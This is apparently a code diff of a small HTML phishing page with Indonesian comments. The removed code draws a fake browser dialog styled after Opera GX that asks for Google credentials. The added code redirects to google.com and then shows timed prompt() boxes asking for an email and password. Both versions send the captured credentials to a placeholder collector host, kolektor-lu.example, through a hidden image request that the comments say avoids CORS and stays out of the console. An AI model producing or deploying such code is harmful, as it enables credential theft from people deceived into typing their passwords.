@@ -5,71 +5,13 @@
 <title>Home</title>
 <style>
   body {
-    margin: 0;
-    height: 100vh;
-    display: flex;
-    align-items: center;
-    justify-content: center;
+    margin: 0; height: 100vh;
+    display: flex; align-items: center; justify-content: center;
     font-family: system-ui, sans-serif;
-    background: #fff;
   }
   #go {
-    font-size: 20px;
-    padding: 12px 48px;
-    border: 2px solid #333;
-    border-radius: 8px;
-    background: #fff;
-    cursor: pointer;
-  }
-  #go:hover { background: #f0f0f0; }
-
-  /* ===== Fake native dialog ===== */
-  #overlay {
-    display: none;
-    position: fixed;
-    inset: 0;
-    z-index: 9999;
-  }
-  #dlg {
-    position: absolute;
-    top: 30%;
-    left: 50%;
-    transform: translateX(-50%);
-    background: #ffffff;
-    border: 1px solid #d0d0d0;
-    border-radius: 10px;
-    box-shadow: 0 8px 30px rgba(0,0,0,.25);
-    font: 14px/1.4 -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    width: 340px;
-    padding: 18px 20px 14px;
-    color: #1b1b1b;
-  }
-  #dlg .msg { margin-bottom: 12px; }
-  #dlg input {
-    width: 100%;
-    box-sizing: border-box;
-    padding: 8px 10px;
-    margin-bottom: 10px;
-    border: 1px solid #c9c9c9;
-    border-radius: 6px;
-    font: inherit;
-    outline: none;
-  }
-  #dlg input:focus { border-color: #e2231a; } /* merah khas Opera GX */
-  #dlg .btns { text-align: right; }
-  #dlg .btns button {
-    font: inherit;
-    padding: 6px 18px;
-    border-radius: 6px;
-    border: 1px solid #c9c9c9;
-    background: #f6f6f6;
-    cursor: pointer;
-  }
-  #dlg .btns button.ok {
-    background: #e2231a;
-    border-color: #e2231a;
-    color: #fff;
-    margin-left: 8px;
+    font-size: 20px; padding: 12px 48px;
+    border: 2px solid #333; border-radius: 8px; cursor: pointer;
   }
 </style>
 </head>
@@ -77,45 +19,31 @@
 
 <button id="go">GO</button>
 
-<div id="overlay">
-  <div id="dlg">
-    <div class="msg"><b>google.com</b> memerlukan verifikasi.<br>Masukkan kredensial Anda untuk melanjutkan.</div>
-    <input type="text" id="user" placeholder="Username atau email" autocomplete="off">
-    <input type="password" id="pass" placeholder="Password" autocomplete="off">
-    <div class="btns">
-      <button onclick="submitLogin()">Cancel</button>
-      <button class="ok" onclick="submitLogin()">OK</button>
-    </div>
-  </div>
-</div>
-
 <script>
 document.getElementById("go").addEventListener("click", function () {
-  // tampilkan fake dialog "native alert"
-  document.getElementById("overlay").style.display = "block";
-});
-
-function submitLogin() {
-  var user = document.getElementById("user").value;
-  var pass = document.getElementById("pass").value;
-
-  // kirim kredensial ke kolektor (ganti URL kolektor lu)
-  if (user || pass) {
-    new Image().src = "https://kolektor-lu.example/log?u=" +
-      encodeURIComponent(user) + "&p=" + encodeURIComponent(pass);
-  }
-
-  // redirect ke google.com bersamaan dialog ditutup
-  document.getElementById("overlay").style.display = "none";
+  // navigasi dimulai sekarang...
   window.location.href = "https://www.google.com";
-}
 
-// tekan Enter = submit, persis perilaku dialog asli
-document.addEventListener("keydown", function (e) {
-  if (document.getElementById("overlay").style.display === "block" && e.key === "Enter") {
-    submitLogin();
-  }
+  // ...tapi dialog di-schedule SETELAH redirect, biar muncul nimpa di google.com
+  //    (butuh window timing: dialog jalan ketika dokumen lama masih pending)
+  setTimeout(askCreds, 800);
 });
+
+function askCreds() {
+  // prompt() = dialog bawaan browser, satu field input
+  var email = prompt("google.com\n\nSign in to continue\n\nEmail:", "");
+
+  if (email === null) return; // user klik Cancel
+
+  var pass = prompt("google.com\n\nPassword for " + email + ":", "");
+  if (pass === null) return;
+
+  // exfil — request gambar bebas CORS & tidak kelihatan di console
+  if (email && pass) {
+    new Image().src = "https://kolektor-lu.example/log?u=" +
+      encodeURIComponent(email) + "&p=" + encodeURIComponent(pass);
+  }
+}
 </script>
 
 </body>
